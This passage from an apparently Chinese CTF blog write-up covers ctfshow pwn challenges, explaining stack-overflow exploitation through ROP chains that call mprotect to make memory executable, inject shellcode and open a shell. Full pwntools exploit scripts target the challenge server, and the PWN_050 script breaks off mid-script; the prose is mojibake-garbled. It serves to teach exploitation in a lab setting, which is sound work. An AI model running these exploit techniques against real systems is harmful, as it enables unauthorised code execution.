<p>åœ¨æ„é€  payload å‰ï¼Œéœ€å…ˆç¡®å®š 3 ä¸ªæ ¸å¿ƒè¦ç´ ï¼š<strong>ç›®æ ‡å†…å­˜åœ°å€ã€<code>mprotect</code> å‚æ•°ã€æ§åˆ¶å¯„å­˜å™¨çš„ Gadget</strong>ï¼Œè¿™äº›æ˜¯ payload çš„ â€œç§¯æœ¨â€ã€‚</p>
<p>æˆ‘ä»¬è¦é€‰æ‹©çš„å†…å­˜åœ°å€æ˜¯<code>0x80DA000</code>ï¼Œç­‰ä¼šï¼Ÿè¿™ä¸æ˜¯bssæ®µå§ï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/159.png"
	width="1125"
	height="494"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/159_hu_fb0f9122edba3687.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/159_hu_6ce7b5fc8e39cc95.png 1024w"
	loading="lazy"
	
		alt="é¡µå¯¹é½çš„åœ°å€"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="546px"
	
></p>
<ul>
<li><strong>é€‰æ‹©åŸå› </strong>ï¼š<code>mprotect</code> è¦æ±‚æ“ä½œçš„å†…å­˜åœ°å€å¿…é¡» <strong>é¡µå¯¹é½</strong>ï¼ˆå³åœ°å€æ˜¯ 4KB/0x1000 çš„æ•´æ•°å€ï¼Œ32 ä½ç³»ç»Ÿé»˜è®¤é¡µå¤§å°ä¸º 4KBï¼‰ï¼ˆ64ä½å°±æ˜¯8kbå’¯ï¼‰ã€‚</li>
<li>ç¨‹åº BSS æ®µèµ·å§‹åœ°å€ï¼ˆå¦‚ <code>0x80DB320</code>ï¼‰ä¸æ»¡è¶³é¡µå¯¹é½ï¼Œè€Œ <code>0x80DA000</code> æ˜¯å†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼ˆæœ«å°¾ä¸‰ä½ä¸º 000ï¼Œç¬¦åˆ 4KB å¯¹é½ï¼‰ï¼Œä¸”å±äºç¨‹åºå¯è®¿é—®çš„å†…å­˜åŒºåŸŸã€‚</li>
</ul>
<p>ç„¶åå°±æ˜¯mprotectå‡½æ•°å‚æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">mprotect</span><span class="p">(</span><span class="n">const</span> <span class="n">void</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">a2</span><span class="p">,</span> <span class="nb">int</span> <span class="n">a3</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>a1æ˜¯startèµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ˜¯0x80DA000ï¼›a2æ˜¯é•¿åº¦èŒƒå›´ï¼Œè¿™é‡Œé€‰æ‹©0x1000ï¼Œè¶³å¤Ÿæˆ‘ä»¬å®¹çº³shellcodeå¤§å°äº†ï¼›a3æ˜¯protï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹æˆçš„æƒé™èŒƒå›´ï¼Œè¿™é‡Œç›´æ¥æ”¹ä¸ºRWXï¼Œä¹Ÿå°±æ˜¯ç®€å†™<code>0x7</code>ã€‚</p>
<p>æœ€åæ˜¯æ§åˆ¶å‡½æ•°å‚æ•°çš„å·¥å…·â€”â€”å…³é”®<code>gadgets</code></p>
<p>32ä½ç¨‹åºç”¨æ ˆä¼ å‚çš„ï¼Œè¿™é‡Œçš„mprotectå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œä¸”è°ƒç”¨åéœ€ç»§ç»­æ§åˆ¶æµç¨‹ï¼Œå› æ­¤éœ€è¦ <code>pop ebx ; pop esi ; pop ebp ; ret</code> è¿™æ ·çš„ Gadgetï¼Œç”¨ROPgadgetæŒ‡ä»¤æŸ¥è¯¢åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/158.png"
	width="1116"
	height="505"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/158_hu_4a650557b39f9dbd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/158_hu_f4b49bbc5059aa15.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="530px"
	
></p>
<p>pop ebx ; pop esi ; pop ebp ; retçš„åœ°å€æ˜¯0x080a019b</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28132</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mprotect</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">read_address</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_ebx_esi_ebp_ret</span> <span class="o">=</span> <span class="mh">0x80a019b</span>
</span></span><span class="line"><span class="cl"><span class="n">start</span> <span class="o">=</span> <span class="mh">0x80DA000</span>
</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl"><span class="n">proc</span> <span class="o">=</span> <span class="mh">0x7</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹äºpayloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_esi_ebp_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆå¡«å……ç¼“å†²åŒºï¼Œè°ƒç”¨mprotectå‡½æ•°ï¼Œæ¥ç€è¾“å…¥mprotectå‡½æ•°çš„3ä¸ªå‚æ•°ï¼Œåœ¨æ­¤ä¹‹å‰å°±è¦ç”¨åˆ°gadgetï¼špop_ebx_esi_ebp_retè¿›è¡Œä¼ å‚ï¼ŒæŒ‰ç…§mprotectå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°å¯¹åº”æ„ä¹‰è¿›è¡Œæ³¨å…¥startã€sizeã€procï¼Œè¿™æ—¶å·²ç»ç»™bsså†…å­˜ç‰‡æ®µå¼€æ”¾äº†å¯æ‰§è¡Œæƒé™ï¼Œç„¶åè¯»å–readå‡½æ•°åœ°å€è¿›è€Œè°ƒç”¨readå‡½æ•°ï¼Œå†ç”¨gadgetï¼špop_ebx_esi_ebp_retè¿›è¡Œä¼ readçš„3ä¸ªå‚æ•°ï¼Œ<strong>è¯»å– åé¢æˆ‘ä»¬æ‰€ä¸Šä¼ çš„shellcode åˆ°ç›®æ ‡å†…å­˜</strong>æ¥æ‰§è¡Œã€‚æœ€åä¸Šä¼ shellcodeã€‚</p>
<p>å…¶å®ä½ å¯ä»¥å‘ç°è¿™ä¹Ÿæ˜¯ret2shellcodeçš„å…¶ä¸­ä¸€ç§ï¼Œåªä¸è¿‡å¤šåŠ äº†mprotectå‡½æ•°æ§åˆ¶æµç¨‹ç½¢äº†ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<p>æ•´ä¸ªæµç¨‹çš„æ ¸å¿ƒé€»è¾‘å°±æ˜¯é€šè¿‡æ ˆæº¢å‡ºæ„å»º â€œå‡½æ•°è°ƒç”¨é“¾â€ï¼Œé€æ­¥å®Œæˆ â€œå¼€æƒé™â†’å†™ä»£ç â†’æ‰§è¡Œä»£ç â€ çš„æ”»å‡»æµç¨‹ã€‚</p>
</blockquote></blockquote>
<p>å¯¹äºè¿™é“é¢˜è€Œè¨€å¯¹æˆ‘æ„Ÿè§¦æ¯”è¾ƒæ·±ï¼ŒåŠ æ·±æˆ‘å¯¹å¯„å­˜å™¨ã€gadgetã€æ•´ä¸ªå‡½æ•°è°ƒç”¨æµç¨‹ã€å‚æ•°ä¼ é€’è¿‡ç¨‹çš„ç†è§£ï¼å¦‚æœä½ è§‰å¾—å¾ˆéš¾è€Œè·³è¿‡ï¼Œé‚£ä½ å°±é”™è¿‡äº†ä¸€æ¬¡PWNå…¥é—¨è€…çš„æå‡æœºä¼šï¼Œåšä¸»å½“æ—¶å•ƒè¿™é¢˜èŠ±äº†å¿«ä¸¤å¤©æ—¶é—´ï¼Œå‡Œæ™¨æ‰å†™å®Œè¿™é¢˜çš„writeupå‘¢ï¼ŒèŠ±ç‚¹è€å¿ƒå»å­¦ï¼ŒPWNerï¼</p>
<h3 id="pwn_050">PWN_050
</h3><p>é¢˜ç›®ï¼šå¥½åƒå“ªé‡Œä¸ä¸€æ ·äº†ï¼›è¿œç¨‹libcç¯å¢ƒ Ubuntu 18ã€‚</p>
<p>å½“ç„¶ï¼Œä½ å¯ä»¥ç»§ç»­ä½¿ç”¨ret2libcæ¥å®Œæˆè¿™é¢˜ï¼Œç”šè‡³ä¼šæ›´ç®€å•ï¼Œè€Œæˆ‘çš„ç›®çš„æ˜¯ä¸ºäº†è®©å¤§å®¶è¿›ä¸€æ­¥å­¦mprotectå‡½æ•°ã€‚</p>
<p>è¿™é‡Œå«æˆ‘ä»¬å¯åŠ¨Ubuntu 18ï¼Œå°±ctfshowé…ç»™æˆ‘ä»¬çš„ï¼Œé‚£æˆ‘ä»¬å°±å¬åŠç”¨å®ƒçš„è™šæ‹Ÿæœºã€‚è™½è¯´æ¯”è¾ƒè€&hellip;&hellip;</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/160.png"
	width="676"
	height="209"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/160_hu_bd2a78b1036eb8c2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/160_hu_e3f01219916f9207.png 1024w"
	loading="lazy"
	
		alt="checksec"
	
	
		class="gallery-image" 
		data-flex-grow="323"
		data-flex-basis="776px"
	
></p>
<p>è·Ÿè¿›ctfshowã€mainå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/161.png"
	width="684"
	height="179"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/161_hu_a971b4f57d92d856.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/161_hu_265d4964c1ecede1.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="382"
		data-flex-basis="917px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/162.png"
	width="910"
	height="175"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/162_hu_8b989b1353770219.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/162_hu_8ac0967a3730fdae.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="520"
		data-flex-basis="1248px"
	
></p>
<p>æ˜æ˜¾çœ‹åˆ°<code>å±é™©çš„getså‡½æ•°</code>ï¼Œctfshowå‡½æ•°è¿™æœ‰æ ˆæº¢å‡ºæ¼æ´ï¼š</p>
<p>ä¸»è¦æµç¨‹å¦‚ä¸‹ï¼ˆ4æ­¥payloadï¼‰ï¼š</p>
<ol>
<li>æ³„æ¼å†…å­˜åœ°å€,é€šè¿‡è®¡ç®—å¾—åˆ°libcåœ°å€</li>
<li>é€šè¿‡mprotectå‡½æ•°æ¥ä¿®æ”¹ä¸€æ®µåŒºåŸŸçš„æƒé™ï¼Œä½rwx</li>
<li>å‘è¿™æ®µåŒºåŸŸå†™å…¥shellcode</li>
<li>è·³è½¬åˆ°å†™å…¥shellcodeçš„åŒºåŸŸï¼Œå¹¶æ‰§è¡Œ</li>
</ol>
<p>æˆ‘ä»¬è¦åˆ©ç”¨mprotectå‡½æ•°æ”¹å˜å†…å­˜æ‰§è¡Œæƒé™ï¼Œé‚£æˆ‘ä»¬éœ€è¦æ‰¾åœ°å€ï¼Œæ­£å¥½è¿™æ¬¡å’Œä¸Šæ¬¡ä¸€æ ·ä¸æ˜¯é¡µå¯¹é½ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/163.png"
	width="1120"
	height="564"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/163_hu_e33d9ccea361e8ae.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/163_hu_e154328f1e16809f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="476px"
	
></p>
<p>bss_start_address = 0x602000</p>
<p>64ä½ç¨‹åºé å¯„å­˜å™¨ä¼ å‚ï¼Œç”¨ROPgadgetå‘½ä»¤æŸ¥è¯¢ç¨‹åºæœ¬èº«çš„gadgetï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/164.png"
	width="1105"
	height="469"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/164_hu_54c58ffaf5f7ac8c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/164_hu_19fc98944930584e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="565px"
	
></p>
<p>pop_rdi_ret = 0x00000000004007e3</p>
<p>ç”¨ROPgadgetå‘½ä»¤æŸ¥libcåº“çš„é€šç”¨gadgetï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/165.png"
	width="1590"
	height="293"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/165_hu_d11a96159544a496.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/165_hu_895ab54d666f15f6.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="542"
		data-flex-basis="1302px"
	
></p>
<p>pop_rdx_ret1 = 0x0000000000001b96</p>
<p>pop_rsi_ret1 = 0x0000000000023a6a</p>
<p>å‰é¢åŠ ä¸ª1æ˜¯å› ä¸ºï¼Œåç»­è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„gadgetå˜é‡ï¼Œå¥½åŒºåˆ†ä¸€äº›ã€‚</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆç¬¬ä¸€ä¸ªgadgetå¯ä»¥ä»ç¨‹åºæœ¬èº«å»æŸ¥åˆ°ï¼Œè€Œç¬¬äºŒä¸‰ä¸ªgadgetåœ°å€å´è¦åœ¨libcåº“è·å–ï¼Ÿ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/166.png"
	width="1235"
	height="85"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/166_hu_3325de85d6270528.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/166_hu_855601e05de87156.png 1024w"
	loading="lazy"
	
		alt="æŸ¥è¯¢ä¸åˆ°"
	
	
		class="gallery-image" 
		data-flex-grow="1452"
		data-flex-basis="3487px"
	
></p>
<p>ä»è¿™å¯ä»¥çœ‹åˆ°ç¨‹åºæœ¬èº«æ˜¯ä¸å¸¦ç¬¬äºŒã€ä¸‰ä¸ªçš„gadgetçš„ï¼Œå› ä¸ºæˆ‘ä»¬è¦åˆ©ç”¨æ¼æ´å»è·å–flagï¼Œè€Œæœ¬èº«ç¨‹åºè¿è¡Œæ˜¯ä¸ç”¨åé¢ä¿©çš„gadgetçš„ã€‚</p>
</blockquote>
<p>expï¼›</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28281</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x00000000004007e3</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_ret1</span> <span class="o">=</span> <span class="mh">0x0000000000001b96</span>  
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_ret1</span> <span class="o">=</span> <span class="mh">0x0000000000023a6a</span>
</span></span><span class="line"><span class="cl"><span class="n">bss_start_address</span> <span class="o">=</span> <span class="mh">0x602000</span>  <span class="c1"># å†…å­˜é¡µå¯¹é½åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">size</span> <span class="o">=</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl"><span class="n">proc</span> <span class="o">=</span> <span class="mh">0x7</span>  <span class="c1"># PROT_READ | PROT_WRITE | PROT_EXEC</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ç¡®ä¿shellcodeåœ°å€æ‰€åœ¨é¡µä¸bss_start_addressåŒé¡µï¼ˆæˆ–è°ƒæ•´mprotectèŒƒå›´ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode_address</span> <span class="o">=</span> <span class="mh">0x602000</span> <span class="o">+</span> <span class="mh">0x100</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é˜¶æ®µ1ï¼šæ³„éœ²libcåœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ctfshow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Hello CTFshow&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leak_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>  <span class="c1"># è®¾ç½®libcåŸºåœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc_base = 0x</span><span class="si">%x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rsi_ret1</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdx_ret1</span>
</span></span><span class="line"><span class="cl"><span class="n">mprotect</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">]</span>
